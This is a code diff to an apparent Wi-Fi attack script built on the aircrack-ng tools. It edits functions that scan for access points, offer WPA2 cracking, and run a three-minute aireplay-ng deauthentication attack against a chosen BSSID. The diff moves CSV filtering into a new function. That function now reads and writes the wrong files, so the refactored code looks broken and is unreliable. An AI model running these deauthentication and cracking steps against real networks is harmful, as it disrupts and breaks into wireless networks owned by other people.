@@ -186,8 +186,7 @@ Just_Analysis () { #edit the core function of analysis here
     echo "starting airodump-ng to find APs, this will take 30 seconds"
     sudo timeout 30 airodump-ng -b abg wlan0 --write wlan0 --output-format csv
     sleep 2
-    cat wlan0-01.csv | grep -v "BSSID" | awk -F ',' '{print $1, $4, $14}' | sed 's/,//g' > bssid.csv
-    #cat bssid1.csv | awk '{print $1, $6, $19}' > bssid.csv
+    Just_Filter
 }
 
 For_mdk3 () {
@@ -407,7 +406,7 @@ For_WPA2_Crack () {
     echo "you chose WPA2 Crack"
     sleep 1
     Just_Analysis
-    cat bssid.csv | awk '{print $3}'
+    cat bssid.csv | awk '{print $3}' | sort
     read -p "which AP (use the name)?: " AP
     echo "you chose $AP"
     cat bssid.csv | grep "$AP" > bssid2.csv
@@ -514,6 +513,13 @@ Just_Deauth_lyer2 () { #edit the core function Layer 2 deauth here
     echo "running for 3 minutes"
     sudo timeout 180 aireplay-ng -0 0 -a $BSSID wlan0
     sleep 2
+}
+
+Just_Filter () { #edit the core function of filtering the CSVs here
+    echo "filtering the APs"
+    cat bssid.csv | grep -v "BSSID" | awk -F ',' '{print $1, $4, $14}' | sed 's/,//g' > bssid1.csv
+    #cat bssid1.csv | awk '{print $1, $6, $19}' > bssid.csv
+
 }
 
 while true; do
